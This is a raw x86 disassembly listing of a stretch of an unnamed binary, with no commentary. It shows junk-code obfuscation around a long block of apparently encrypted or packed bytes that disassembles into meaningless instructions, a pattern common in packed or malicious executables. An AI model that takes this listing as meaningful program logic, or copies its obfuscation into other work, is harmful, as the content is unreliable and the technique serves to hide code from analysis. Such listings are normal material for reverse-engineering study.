  4027f1:	add    BYTE PTR [eax],al
  4027f3:	mov    DWORD PTR [ebp-0x70],0x231c
  4027fa:	cmp    DWORD PTR ds:0x4229aa,0x0
  402801:	mov    DWORD PTR ds:0x422962,0x2a7e
  40280b:	mov    DWORD PTR ds:0x42293e,0x75fd
  402815:	jmp    0x40286f
  40281a:	not    DWORD PTR ds:0x4228a2
  402820:	jg     0x40285d
  402826:	push   0x445a
  40282b:	push   DWORD PTR [ebp-0x24]
  40282e:	push   0x4228fe
  402833:	push   0x30cc
  402838:	push   0x5f1f
  40283d:	call   DWORD PTR ds:0x42a288
  402843:	xor    DWORD PTR ds:0x4228da,0x678e
  40284d:	adc    DWORD PTR ds:0x4228a2,0x5868
  402857:	xor    DWORD PTR ds:0x42296e,ecx
  40285d:	or     DWORD PTR ds:0x4228ba,edi
  402863:	or     DWORD PTR ds:0x42299e,ecx
  402869:	sbb    DWORD PTR ds:0x422966,ecx
  40286f:	mov    DWORD PTR [ebp-0x6c],0x1337
  402876:	mov    eax,ds:0x42294a
  40287b:	add    eax,DWORD PTR ds:0x42291e
  402881:	mov    ds:0x42294a,eax
  402886:	mov    DWORD PTR [ebp-0x70],0x7593
  40288d:	sbb    DWORD PTR ds:0x422906,edx
  402893:	mov    DWORD PTR [ebp-0x6c],0x11b8
  40289a:	mov    DWORD PTR [ebp-0x70],0x3b72
  4028a1:	mov    DWORD PTR [ebp-0x6c],0x3abc
  4028a8:	jmp    0x402e32
  4028ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028ae:	in     eax,0x5e
  4028b0:	ficom  DWORD PTR [eax+eiz*2]
  4028b3:	adc    ch,BYTE PTR [ecx-0x57e79dc5]
  4028b9:	stos   DWORD PTR es:[edi],eax
  4028ba:	popf   
  4028bb:	pop    eax
  4028bc:	mov    dl,0xce
  4028be:	in     eax,0x16
  4028c0:	push   ss
  4028c1:	cmp    eax,0x69161604
  4028c6:	sbb    ebx,edx
  4028c8:	out    0xc,eax
  4028ca:	clc    
  4028cb:	int    0x81
  4028cd:	scas   al,BYTE PTR es:[edi]
  4028ce:	sbb    dl,dh
  4028d0:	(bad)  
  4028d1:	xchg   ecx,eax
  4028d2:	cmp    al,0x6
  4028d4:	adc    ch,BYTE PTR [eax-0x74]
  4028d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028d8:	imul   eax,DWORD PTR [ebx],0xffffffcc
  4028db:	ins    BYTE PTR es:[edi],dx
  4028dc:	pop    ebp
  4028dd:	shl    BYTE PTR [ebx+0x378cbc17],0x96
  4028e4:	xchg   ebp,edx
  4028e6:	cmp    ecx,DWORD PTR [ebx+edi*4]
  4028e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028ea:	cli    
  4028eb:	jg     0x4028a6
  4028ed:	jmp    0x1b13:0x290af66b
  4028f4:	out    0x8,eax
  4028f6:	push   ss
  4028f7:	jnp    0x40296c
  4028f9:	fadd   DWORD PTR [ecx-0x5f65923c]
  4028ff:	scas   al,BYTE PTR es:[edi]
  402900:	pop    ebx
  402901:	mov    eax,ds:0xe2f7ee6f
  402906:	imul   esi,DWORD PTR [esi+0x651ee6ba],0x2044759e
  402910:	pop    ds
  402911:	mov    bh,0x80
  402913:	cmp    al,BYTE PTR [ebx]
  402915:	push   ds
  402916:	test   DWORD PTR [ebp+ecx*1+0x77dd68b8],0xc35662bf
  402921:	(bad)  [eax-0x72]
  402924:	sbb    ecx,ebp
  402926:	xchg   ecx,eax
  402927:	xchg   ebp,eax
  402928:	repnz xchg ah,dh
  40292b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40292c:	jo     0x4029a1
  40292e:	or     ebp,ecx
  402930:	shr    BYTE PTR [edx-0x4dd0e668],0x2d
  402937:	out    0xae,al
  402939:	mov    bh,0xc9
  40293b:	mov    ecx,0x1a52cf0b
  402940:	clc    
  402941:	pop    esi
  402942:	stos   BYTE PTR es:[edi],al
  402943:	retf   
  402944:	test   DWORD PTR [esi+edx*2-0x2d],0xd8df2309
  40294c:	mov    al,0x9d
  40294e:	test   al,0x38
  402950:	jl     0x4029ae
  402952:	jmp    0x521:0xc3058b4d
  402959:	xchg   esp,eax
  40295a:	jns    0x4028e2
  40295c:	mov    bl,0xef
  40295e:	in     al,0xb1
  402960:	ss inc esi
  402962:	sti    
  402963:	push   ebx
  402964:	mul    DWORD PTR [ecx-0x37957459]
  40296a:	sar    BYTE PTR [ebx+0x42e52941],cl
  402970:	enter  0xcf27,0xfc
  402974:	sbb    eax,0x3422b6ce
  402979:	cld    
  40297a:	retf   
  40297b:	pop    ebx
  40297c:	mov    eax,0xe2bbaf26
  402981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402982:	mov    ch,BYTE PTR [edi-0x41]
  402985:	push   eax
  402986:	je     0x402993
  402988:	arpl   WORD PTR [edx+0x3d489a75],si
  40298e:	sub    BYTE PTR [ecx+eiz*1],dh
  402991:	jecxz  0x4029d2
  402993:	imul   ecx,DWORD PTR [ebp-0x59],0xffffffaa
  402997:	mov    ch,0xe3
  402999:	pushf  
  40299a:	mov    WORD PTR [edx+0x533a80d3],es
  4029a0:	push   cs
  4029a1:	mov    cl,0x57
  4029a3:	push   edi
  4029a4:	cmp    al,al
  4029a6:	sar    BYTE PTR [edi],0xc9
  4029a9:	frstor [edx+0xa]
  4029ac:	(bad)  
  4029ad:	stos   BYTE PTR es:[edi],al
  4029ae:	push   edx
  4029af:	pushfw 
  4029b1:	icebp  
  4029b2:	pusha  
  4029b3:	pop    eax
  4029b4:	imul   BYTE PTR [ebx-0x6558259a]
  4029ba:	inc    ecx
  4029bb:	in     eax,0xbc
  4029bd:	ins    BYTE PTR es:[edi],dx
  4029be:	inc    edx
  4029bf:	mov    al,0x6e
  4029c1:	outs   dx,DWORD PTR ds:[esi]
  4029c2:	fistp  QWORD PTR [eax+0x7a0601cd]
  4029c8:	mov    bl,0x57
  4029ca:	ins    DWORD PTR es:[edi],dx
  4029cb:	aam    0xaa
  4029cd:	sbb    ah,dh
  4029cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029d0:	add    al,0x9e
  4029d2:	imul   ah
  4029d4:	xchg   esp,eax
  4029d5:	or     DWORD PTR [eax],ebp
  4029d7:	push   0xaa7430c4
  4029dc:	push   ds
  4029dd:	adc    ah,BYTE PTR [esi-0x4481ff90]
  4029e3:	add    ecx,DWORD PTR [ecx-0x7fad4d0a]
  4029e9:	mov    ah,0x59
  4029eb:	jnp    0x4029d7
  4029ed:	xor    edx,DWORD PTR ds:0x9c9c5e4
  4029f3:	jae    0x40299a
  4029f5:	and    esi,esp
  4029f7:	mov    DWORD PTR [edi],edi
  4029f9:	shl    DWORD PTR [ebp+0x6f3a93b0],1
  4029ff:	cmp    al,0x9c
  402a01:	and    ch,al
  402a03:	and    eax,esi
  402a05:	pop    edx
  402a06:	cdq    
  402a07:	cmp    DWORD PTR [ecx],edi
  402a09:	and    esi,DWORD PTR [esi+0x51812f07]
  402a0f:	stc    
  402a10:	out    0x91,al
  402a12:	dec    edx
  402a13:	stc    
  402a14:	mov    esi,0xd006c816
  402a19:	push   ebp
  402a1a:	test   al,0x1c
  402a1c:	jbe    0x402a94
  402a1e:	xor    esp,DWORD PTR [ecx-0x46593862]
  402a24:	test   eax,0x9c1980d1
  402a29:	test   eax,0x1680f285
  402a2e:	dec    edx
  402a2f:	ins    BYTE PTR es:[edi],dx
  402a30:	mov    edi,0xea1e4291
  402a35:	cld    
  402a36:	rol    cl,0xb3
  402a39:	dec    ecx
  402a3a:	iret   
  402a3b:	mov    esp,0x565acbe8
  402a40:	sub    al,0x71
  402a42:	pop    esi
  402a43:	ss push ds
  402a45:	dec    esp
  402a46:	clc    
  402a47:	call   0xb0530e65
  402a4c:	dec    esi
  402a4d:	stc    
  402a4e:	inc    esi
  402a4f:	jns    0x402a4f
  402a51:	adc    ebx,ebp
  402a53:	or     BYTE PTR [edi+0x45],bl
  402a56:	test   DWORD PTR [esi+0x3c73bdd5],esi
  402a5c:	dec    ecx
  402a5d:	cmp    edi,edi
  402a5f:	sub    al,al
  402a61:	int3   
  402a62:	add    eax,0x2b0564e7
  402a67:	ficomp DWORD PTR [eax]
  402a69:	jle    0x402ac5
  402a6b:	lea    eax,[ebx+0x522a319f]
  402a71:	scas   eax,DWORD PTR es:[edi]
  402a72:	shl    esi,cl
  402a74:	pop    ecx
  402a75:	sbb    eax,0x3a10ddbd
  402a7a:	es push es
  402a7c:	scas   eax,DWORD PTR es:[edi]
  402a7d:	sub    al,ah
  402a7f:	inc    esi
  402a80:	into   
  402a81:	xor    dh,BYTE PTR [ebp-0x68]
  402a84:	pop    esi
  402a85:	lds    esi,FWORD PTR [edi-0x4d]
  402a88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a89:	xchg   bh,al
  402a8b:	pop    ebp
  402a8c:	jl     0x402a36
  402a8e:	pop    edi
  402a8f:	int    0x29
  402a91:	mov    dl,0xd2
  402a93:	or     DWORD PTR [edx+0x256a2fee],ebx
  402a99:	test   al,0x7e
  402a9b:	mov    dl,0xbf
  402a9d:	out    dx,eax
  402a9e:	pop    edx
  402a9f:	sbb    DWORD PTR ds:0x9916ee4d,edx
  402aa5:	dec    eax
  402aa6:	pop    ebp
  402aa7:	mov    edi,0x138544ea
  402aac:	icebp  
  402aad:	mov    ebx,?
  402aaf:	shl    DWORD PTR [ecx],0x55
  402ab2:	fs std 
  402ab4:	leave  
  402ab5:	arpl   WORD PTR fs:[edx+0x69],ax
  402ab9:	jns    0x402a79
  402abb:	xchg   ebx,eax
  402abc:	jns    0x402aab
  402abe:	fistp  DWORD PTR [ecx-0x393479c8]
  402ac4:	cdq    
  402ac5:	popf   
  402ac6:	jg     0x402a87
  402ac8:	fistp  QWORD PTR [esi]
  402aca:	stos   BYTE PTR es:[edi],al
  402acb:	ja     0x402b0d
  402acd:	pop    ecx
  402ace:	loop   0x402ac4
  402ad0:	mov    ds:0xcbd66211,eax
  402ad5:	pop    ebp
  402ad6:	aaa    
  402ad7:	xchg   DWORD PTR [edx],esi
  402ad9:	into   
  402ada:	dec    ebx
  402adb:	xchg   esi,eax
  402adc:	loope  0x402adb
  402ade:	jnp    0x402a86
  402ae0:	mov    eax,ds:0x1d219a09
  402ae5:	arpl   si,ax
  402ae7:	push   cs
  402ae8:	push   edi
  402ae9:	ins    DWORD PTR es:[edi],dx
  402aea:	mov    ds:0x71fd4523,al
  402aef:	sbb    BYTE PTR [ecx],ah
  402af1:	push   eax
  402af2:	repz push esp
  402af4:	pusha  
  402af5:	retf   0xf9b6
  402af8:	dec    esp
  402af9:	lea    edx,[ecx]
  402afb:	xlat   BYTE PTR ds:[ebx]
  402afc:	jmp    0x2063:0x475408b5
  402b03:	popa   
  402b04:	and    bh,BYTE PTR [eax]
  402b06:	out    dx,al
  402b07:	sub    eax,0xf51cedd4
  402b0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b0d:	push   esi
  402b0e:	test   eax,0x1bd58a7d
  402b13:	mov    dl,0xd5
  402b15:	inc    ebx
  402b16:	xchg   ecx,eax
  402b17:	cdq    
  402b18:	xor    al,0xdc
  402b1a:	dec    esi
  402b1b:	stos   DWORD PTR es:[edi],eax
  402b1c:	nop
  402b1d:	imul   esi,DWORD PTR ds:0x8f6d45c2,0xbf83d4f6
  402b27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b28:	stos   BYTE PTR es:[edi],al
  402b29:	dec    esp
  402b2a:	cmp    esp,DWORD PTR [eax]
  402b2c:	aas    
  402b2d:	adc    al,0xa
  402b2f:	mov    edi,0xfc440a8e
  402b34:	pop    ebp
  402b35:	jl     0x402af3
  402b37:	clc    
  402b38:	(bad)  
  402b39:	das    
  402b3a:	pop    esi
  402b3b:	bound  eax,QWORD PTR [eax+0x3e288dea]
  402b41:	xchg   ebx,eax
  402b42:	leave  
  402b43:	mov    bl,0xc1
  402b45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b46:	mov    ebp,0xfc739478
  402b4b:	and    eax,0xd7e66e16
  402b50:	or     edx,esp
  402b52:	mov    esp,0x2093e6a4
  402b57:	sar    DWORD PTR [edx],0xca
  402b5a:	cmp    ebp,DWORD PTR fs:[edx+edx*8+0x7b6694c5]
  402b62:	int3   
  402b63:	bswap  eax
  402b65:	sbb    ebx,DWORD PTR [ecx+0x62]
  402b68:	in     eax,dx
  402b69:	je     0x402b30
  402b6b:	dec    esi
  402b6c:	push   cs
  402b6d:	mov    cx,dx
  402b70:	or     DWORD PTR [ebp-0x32849c48],ebp
  402b76:	and    eax,0x92b78aee
  402b7b:	mov    esi,DWORD PTR [esi-0xe]
  402b7e:	repnz test eax,0xf4860d0c
  402b84:	js     0x402b4f
  402b86:	es cdq 
  402b88:	das    
  402b89:	lock sbb bh,cl
  402b8c:	scas   eax,DWORD PTR es:[edi]
  402b8d:	add    BYTE PTR [eax+0x23],bl
  402b90:	sbb    DWORD PTR [edx],0xffffffb7
  402b93:	in     eax,dx
  402b94:	clc    
  402b95:	jne    0x402bd9
  402b97:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  402b99:	dec    ebx
  402b9a:	mov    WORD PTR [esi],ds
  402b9c:	jge    0x402bb3
  402b9e:	inc    esp
  402b9f:	push   ebp
  402ba0:	dec    ebp
  402ba1:	pop    ss
  402ba2:	dec    ebx
  402ba3:	sub    BYTE PTR [ebx+0x4f4f6f47],dh
  402ba9:	add    eax,0x1a607860
  402bae:	xor    ah,BYTE PTR ds:0x51b16a96
  402bb4:	mov    ds:0xa9fd314b,al
  402bb9:	mov    ebx,0x7ff4f1bb
  402bbe:	cmp    DWORD PTR [edi-0x10],edx
  402bc1:	lods   al,BYTE PTR ds:[esi]
  402bc2:	std    
  402bc3:	lea    ebp,[ecx]
  402bc5:	mov    DWORD PTR [esp+0x6769127e],esp
  402bcc:	pushf  
  402bcd:	aad    0x94
  402bcf:	jb     0x402be5
  402bd1:	xchg   BYTE PTR [esi],dh
  402bd3:	inc    ebp
  402bd4:	fimul  DWORD PTR [edi]
  402bd6:	in     eax,0x66
  402bd8:	in     eax,dx
  402bd9:	out    dx,al
  402bda:	adc    DWORD PTR [eax],0x2f11ef39
  402be0:	mov    eax,0x8ecdb3fa
  402be5:	xchg   edi,eax
  402be6:	inc    esp
  402be7:	es clc 
  402be9:	push   ecx
  402bea:	or     al,0xb8
  402bec:	or     cl,BYTE PTR [esi-0x2]
  402bef:	dec    ecx
  402bf0:	pushf  
  402bf1:	mov    al,BYTE PTR [edx]
  402bf3:	push   cs
  402bf4:	scas   al,BYTE PTR es:[edi]
  402bf5:	jp     0x402b79
  402bf7:	cmp    eax,0x92901e91
  402bfc:	retf   0xd03a
  402bff:	stc    
  402c00:	sub    DWORD PTR [edi+ebp*4+0x6d8c2c1d],esp
  402c07:	mov    cl,dl
  402c09:	bound  eax,QWORD PTR [edx]
  402c0b:	sbb    eax,0xc28b3b37
  402c10:	jnp    0x402c62
  402c12:	adc    esi,DWORD PTR [esi+0x72]
  402c15:	repz mov edx,DWORD PTR [ecx+ebp*4]
  402c19:	(bad)  
  402c1a:	lahf   
  402c1b:	stos   DWORD PTR es:[edi],eax
  402c1c:	cmp    al,BYTE PTR cs:[edi]
  402c1f:	cmp    BYTE PTR [ecx+0x62],al
  402c22:	jno    0x402c00
  402c24:	call   0x34247347
  402c29:	mov    ds:0x59ae96cc,eax
  402c2e:	(bad)  
  402c2f:	mov    esp,DWORD PTR [edi]
  402c31:	lods   eax,DWORD PTR ds:[esi]
  402c32:	pop    eax
  402c33:	mov    edx,0xd50bff6c
  402c38:	mov    ah,0xd8
  402c3a:	add    eax,DWORD PTR [ebp-0x52]
  402c3d:	shl    BYTE PTR [eax+edx*8-0x22],0xa7
  402c42:	push   edx
  402c43:	out    0x8c,eax
  402c45:	push   ds
  402c46:	mov    DWORD PTR [ecx-0x20f2218],0x7dcdf748
  402c50:	push   0x373757d
  402c55:	push   es
  402c56:	sub    esi,DWORD PTR [edx-0x7b]
  402c59:	test   DWORD PTR [edx-0x4b2351ad],edi
  402c5f:	enter  0x65d6,0x10
  402c63:	(bad)
  402c66:	pop    ebx
  402c67:	inc    BYTE PTR [esi-0x78]
  402c6a:	loopne 0x402ca2
  402c6c:	push   ebp
  402c6d:	adc    eax,0xaca47e6e
  402c72:	push   esi
  402c73:	addr16 cmc 
  402c75:	pushf  
  402c76:	lock ret 
  402c78:	arpl   WORD PTR [esi+0x50],si
  402c7b:	rol    BYTE PTR [ebx],cl
  402c7d:	xchg   esp,eax
  402c7e:	pop    esp
  402c7f:	add    BYTE PTR [edi-0x1fc87b27],dh
  402c85:	fs scas eax,DWORD PTR es:[edi]
  402c87:	scas   al,BYTE PTR es:[edi]
  402c88:	adc    esp,DWORD PTR [esi+ecx*1-0x20a99c33]
  402c8f:	sahf   
  402c90:	aaa    
  402c91:	(bad)
  402c94:	fbstp  TBYTE PTR ds:0x9bdf6401
  402c9a:	push   0x43
  402c9c:	or     eax,0x68d8e435
  402ca1:	and    eax,0xebbe2563
  402ca6:	add    BYTE PTR ds:[edi],0xbc
  402caa:	jnp    0x402c59
  402cac:	aas    
  402cad:	and    ecx,DWORD PTR [esi]
  402caf:	call   0xf90c:0xa3b22e9f
  402cb6:	xor    al,0x93
  402cb8:	inc    ebp
  402cb9:	jns    0x402c92
  402cbb:	fsubr  DWORD PTR [ebx+0x1d]
  402cbe:	jmp    FWORD PTR [edx-0x39]
  402cc1:	mov    ds:0x5445ae0c,al
  402cc6:	je     0x402cb4
  402cc8:	pop    ss
  402cc9:	jg     0x402c80
  402ccb:	xlat   BYTE PTR ds:[ebx]
  402ccc:	test   BYTE PTR [edi+0x60],ch
  402ccf:	jo     0x402d13
  402cd1:	popa   
  402cd2:	jle    0x402d4a
  402cd4:	(bad)  
  402cd5:	ja     0x402d31
  402cd7:	add    eax,0xf1ace25
  402cdc:	mov    ah,0x73
  402cde:	aam    0x71
  402ce0:	mov    BYTE PTR [ebp+0x7880318e],ch
  402ce6:	das    
  402ce7:	and    esp,DWORD PTR [ecx]
  402ce9:	sar    BYTE PTR [edi+0x6e2d4209],cl
  402cef:	xor    eax,0x3711e65b
  402cf4:	mov    al,ds:0xf3a1e897
  402cf9:	xchg   esi,eax
  402cfa:	xor    esi,eax
  402cfc:	mov    ah,0xc6
  402cfe:	ja     0x402cd9
  402d00:	or     ebp,DWORD PTR [esi]
  402d02:	xor    eax,0x14859f2a
  402d07:	fdivr  DWORD PTR [ecx+0x6c8c704d]
  402d0d:	add    DWORD PTR [ecx+ebp*4+0x35],0xffffffe2
  402d12:	add    eax,DWORD PTR [edi]
  402d14:	mov    DWORD PTR [edx+0x6282cf8c],ecx
  402d1a:	sbb    dl,BYTE PTR [esi+0x26]
  402d1d:	scas   al,BYTE PTR es:[edi]
  402d1e:	call   0x72f7:0xdfb29a34
  402d25:	inc    esi
  402d26:	in     eax,dx
  402d27:	clc    
  402d28:	leave  
  402d29:	gs addr16 pop esp
  402d2c:	(bad)  
  402d2d:	fidiv  DWORD PTR ds:0x8b09a5a9
  402d33:	in     eax,dx
  402d34:	sub    DWORD PTR [eax],ebx
  402d36:	aaa    
  402d37:	xor    BYTE PTR [ebx],bh
  402d39:	xchg   esp,eax
  402d3a:	xor    DWORD PTR [ebx+0x51],ebx
  402d3d:	pop    ebx
  402d3e:	pop    es
  402d3f:	call   0x2e9aea07
  402d44:	push   ebp
  402d45:	mov    ds:0xf340fab2,al
  402d4a:	scas   al,BYTE PTR es:[edi]
  402d4b:	cli    
  402d4c:	aam    0x8b
  402d4e:	test   al,0xba
  402d50:	lods   eax,DWORD PTR ds:[esi]
  402d51:	pop    ss
  402d52:	cmp    ch,BYTE PTR [edi]
  402d54:	adc    ebp,esp
  402d56:	mov    edx,0xb715a2ca
  402d5b:	push   es
  402d5c:	or     al,0xc1
  402d5e:	xchg   edi,eax
  402d5f:	test   eax,0xbaae00f2
  402d64:	stos   DWORD PTR es:[edi],eax
  402d65:	fcom   st(2)
  402d67:	aam    0x7d
  402d69:	mov    ebx,0x69ae4e4f
  402d6e:	shr    DWORD PTR [ecx+0xa],cl
  402d71:	dec    eax
  402d72:	push   esp
  402d73:	aam    0x8c
  402d75:	xchg   edx,eax
  402d76:	scas   al,BYTE PTR es:[edi]
  402d77:	shl    esp,0xe3
  402d7a:	ds lahf 
  402d7c:	sbb    eax,0x4cad8b74
  402d81:	daa    
  402d82:	mov    gs,ebx
  402d84:	jl     0x402d73
  402d86:	rcr    dl,cl
  402d88:	int    0x91
  402d8a:	fstp   QWORD PTR [ebp-0x6e]
  402d8d:	mov    ecx,0xaa9a199f
  402d92:	and    DWORD PTR [ebp+0x62],ecx
  402d95:	push   0xffffffb5
  402d97:	mov    ?,WORD PTR [esi]
  402d99:	fistp  QWORD PTR [eax]
  402d9b:	xlat   BYTE PTR ds:[ebx]
  402d9c:	sti    
  402d9d:	sbb    BYTE PTR [ebx-0x1a],bh
  402da0:	jg     0x402d3b
  402da2:	inc    eax
  402da3:	ins    DWORD PTR es:[edi],dx
  402da4:	or     al,al
  402da6:	lahf   
  402da7:	mov    cl,0xb
  402da9:	retf   
  402daa:	pop    ss
  402dab:	sbb    BYTE PTR [esi+0x24],0x5a
  402daf:	and    DWORD PTR [edx+esi*4-0x175bae4e],ebp
  402db6:	fwait
  402db7:	cmp    dl,dl
  402db9:	jmp    0xd677:0x9baa2886
  402dc0:	mov    DWORD PTR [ebx],0x55509130
  402dc6:	jmp    0x6703:0x18db08f1
  402dcd:	out    dx,eax
  402dce:	std    
  402dcf:	pop    ebp
  402dd0:	or     BYTE PTR [edx+0x7a5189f3],cl
  402dd6:	stos   DWORD PTR es:[edi],eax
  402dd7:	scas   al,BYTE PTR es:[edi]
  402dd8:	test   DWORD PTR [ebp-0x34d7acde],ebp
  402dde:	loope  0x402d89
  402de0:	mov    bh,0x92
  402de2:	inc    eax
  402de3:	das    
  402de4:	mov    WORD PTR ds:0x590a3072,ss
  402dea:	push   eax
  402deb:	jecxz  0x402e39
  402ded:	sbb    edi,DWORD PTR [edi]
  402def:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402df0:	inc    edi
  402df1:	sub    cl,cl
  402df3:	(bad)  
  402df4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402df5:	cmp    cl,BYTE PTR [ecx]
  402df7:	mov    edi,0xa8ea5e20
  402dfc:	sub    eax,0x7b5c4973
  402e01:	cmc    
  402e02:	mov    bh,0xa7
  402e04:	dec    edx
  402e05:	jae    0x402dff
  402e07:	jne    0x402e57
  402e09:	dec    edx
  402e0a:	jne    0x402d96
  402e0c:	and    al,0xb4
  402e0e:	popf   
  402e0f:	push   cs
  402e10:	imul   ebp,DWORD PTR [edx+edi*1],0xe0ffd028
  402e17:	xor    BYTE PTR [eax],cl
  402e19:	adc    al,0x76
  402e1b:	and    DWORD PTR [esi],esp
  402e1d:	inc    ecx
  402e1e:	add    eax,edx
  402e20:	sbb    ecx,DWORD PTR [edx-0x4c4f4e15]
  402e26:	ret    
  402e27:	push   ebx
  402e28:	loop   0x402df7
  402e2a:	fdiv   QWORD PTR [ecx]
  402e2c:	cmp    BYTE PTR [ebx+0x6],al
  402e2f:	call   DWORD PTR [esi]
  402e31:	mov    es,edi
  402e33:	inc    ebp
  402e34:	cwde   
  402e35:	inc    ebp
  402e36:	sbb    eax,DWORD PTR [eax]
  402e38:	add    bh,al
  402e3a:	add    eax,0x42299e
  402e3f:	sbb    BYTE PTR [edi],al
  402e41:	add    BYTE PTR [eax],al
  402e43:	mov    DWORD PTR [ebp-0x64],0x767d
  402e4a:	cmp    DWORD PTR ds:0x42295a,0x0
  402e51:	mov    DWORD PTR ds:0x4229ba,0x78de
  402e5b:	mov    DWORD PTR ds:0x422976,0x1706
  402e65:	jmp    0x402ecb
  402e6a:	mov    DWORD PTR ds:0x4228ca,0x464
  402e74:	not    eax
  402e76:	jne    0x402ea1
  402e7c:	push   0x8a0f
  402e81:	call   DWORD PTR ds:0x42a28c
  402e87:	add    DWORD PTR ds:0x422982,ecx
  402e8d:	add    DWORD PTR ds:0x422912,0x4228d6
  402e97:	add    DWORD PTR ds:0x42291a,0x3216
  402ea1:	sub    DWORD PTR ds:0x4229be,0x591
  402eab:	adc    DWORD PTR ds:0x4228f2,0x4409
  402eb5:	add    DWORD PTR ds:0x4228fe,ebx
  402ebb:	add    DWORD PTR ds:0x4229ae,0x46bd
  402ec5:	sub    DWORD PTR ds:0x422936,ecx
  402ecb:	mov    DWORD PTR [ebp-0x60],0x1d973857
  402ed2:	mov    DWORD PTR ds:0x42294a,0xbf3
  402edc:	mov    DWORD PTR [ebp-0x5c],0x0
  402ee3:	mov    DWORD PTR [ebp-0x34],0x599d
  402eea:	add    DWORD PTR ds:0x4228fa,edi
  402ef0:	mov    DWORD PTR [ebp-0x2c],0x165d
  402ef7:	movzx  eax,WORD PTR ds:0x4228a2
  402efe:	and    DWORD PTR ds:0x4229ae,eax
  402f04:	mov    DWORD PTR [ebp-0x1c],0xc51
  402f0b:	xor    eax,0x7ef6
  402f10:	mov    DWORD PTR [ebp-0x44],0x3f55
  402f17:	inc    eax
  402f18:	mov    DWORD PTR [ebp-0x44],0x1
  402f1f:	mov    DWORD PTR [ebp-0x44],0x42e8
  402f26:	cmp    DWORD PTR ds:0x4228a6,0x0
  402f2d:	mov    DWORD PTR ds:0x422926,ebx
  402f33:	mov    DWORD PTR ds:0x42296e,0x475b
  402f3d:	jmp    0x403081
  402f42:	mov    DWORD PTR ds:0x4228fa,0x2105
  402f4c:	not    eax
  402f4e:	jne    0x402f83
  402f54:	push   0x132b
  402f59:	push   DWORD PTR [ebp-0x14]
  402f5c:	push   DWORD PTR [ebp-0x10]
  402f5f:	call   DWORD PTR ds:0x42a290
  402f65:	xor    DWORD PTR ds:0x422932,0x9bb
  402f6f:	or     DWORD PTR ds:0x422996,0x4228ea
  402f79:	and    DWORD PTR ds:0x422932,0x4229ce
  402f83:	and    DWORD PTR ds:0x4229ce,edi
  402f89:	add    DWORD PTR ds:0x4228e6,0x4228da
  402f93:	dec    DWORD PTR ds:0x4229b2
  402f99:	xor    DWORD PTR ds:0x4228ee,ecx
  402f9f:	cmp    DWORD PTR ds:0x422996,0x0
  402fa6:	mov    DWORD PTR ds:0x4228e6,0xf94
  402fb0:	mov    DWORD PTR ds:0x4228de,0x6d8f
  402fba:	mov    DWORD PTR ds:0x42291e,0x78af
  402fc4:	jmp    0x403081
  402fc9:	mov    DWORD PTR ds:0x42290e,ebx
  402fcf:	mov    DWORD PTR ds:0x4228fe,0x3885
  402fd9:	jge    0x402ffe
  402fdf:	push   0x3dec
  402fe4:	call   DWORD PTR ds:0x42a044
  402fea:	add    DWORD PTR ds:0x42298e,0x4228ba
  402ff4:	sub    DWORD PTR ds:0x422916,0x422996
  402ffe:	add    DWORD PTR ds:0x42294e,0x308f
  403008:	sub    DWORD PTR ds:0x42299a,ebx
  40300e:	or     DWORD PTR ds:0x4228e2,0x4229ce
  403018:	and    DWORD PTR ds:0x422996,0x422972
  403022:	cmp    DWORD PTR ds:0x4228be,0x0
  403029:	mov    DWORD PTR ds:0x422896,0x7e8b
  403033:	mov    DWORD PTR ds:0x4228d2,0x6e2b
  40303d:	jmp    0x403081
  403042:	mov    eax,ds:0x42294e
  403047:	mov    DWORD PTR ds:0x422912,0x27c8
  403051:	jl     0x403071
  403057:	call   DWORD PTR ds:0x42a294
  40305d:	xor    DWORD PTR ds:0x4228f6,0x34a0
  403067:	and    DWORD PTR ds:0x42299e,0x4228c2
  403071:	or     DWORD PTR ds:0x4229b2,0x422916
  40307b:	xor    DWORD PTR ds:0x422892,ecx
  403081:	mov    eax,DWORD PTR [ebp-0x60]
  403084:	shl    ecx,0x1e
  403087:	mov    ecx,DWORD PTR [ebp-0x5c]
  40308a:	and    DWORD PTR ds:0x422912,0x10bb
  403094:	push   ecx
  403095:	inc    DWORD PTR ds:0x42298e
  40309b:	push   eax
  40309c:	push   0xddf
  4030a1:	push   0x2d0f
  4030a6:	add    DWORD PTR ds:0x4228d6,0x562b
  4030b0:	call   0x421af6
  4030b5:	mov    ecx,DWORD PTR [ebp-0x68]
  4030b8:	add    DWORD PTR ds:0x4228e6,0x12e8
  4030c2:	mov    edx,DWORD PTR [ebp-0x64]
  4030c5:	sub    DWORD PTR ds:0x42290e,0x5673
  4030cf:	xor    eax,ecx
  4030d1:	not    ecx
  4030d3:	mov    ecx,DWORD PTR [ebp-0x70]
  4030d6:	add    edx,0x725d
  4030dc:	mov    edx,DWORD PTR [ebp-0x6c]
  4030df:	sub    edx,DWORD PTR ds:0x4228f2
  4030e5:	sub    eax,ecx
  4030e7:	cmp    DWORD PTR ds:0x4228c2,0x0
  4030ee:	mov    DWORD PTR ds:0x42295a,0x2680
  4030f8:	mov    edx,0xd63
  4030fd:	movzx  edx,BYTE PTR ds:0x4229ce
  403104:	mov    DWORD PTR ds:0x4228b6,ecx
  40310a:	jmp    0x403179
  40310f:	mov    DWORD PTR ds:0x4228f2,0x12c1
  403119:	mov    DWORD PTR ds:0x4228d2,ecx
  40311f:	jl     0x403160
  403125:	push   0x234a
  40312a:	push   0x7349
  40312f:	push   DWORD PTR [ebp-0x28]
  403132:	call   DWORD PTR ds:0x42a00c
  403138:	xor    edx,edx
  40313a:	or     edx,DWORD PTR ds:0x4229fe
  403140:	mov    edx,DWORD PTR [edx]
  403142:	sbb    DWORD PTR ds:0x4229ca,edx
  403148:	sbb    edx,DWORD PTR ds:0x42294a
  40314e:	mov    edx,DWORD PTR ds:0x42293e
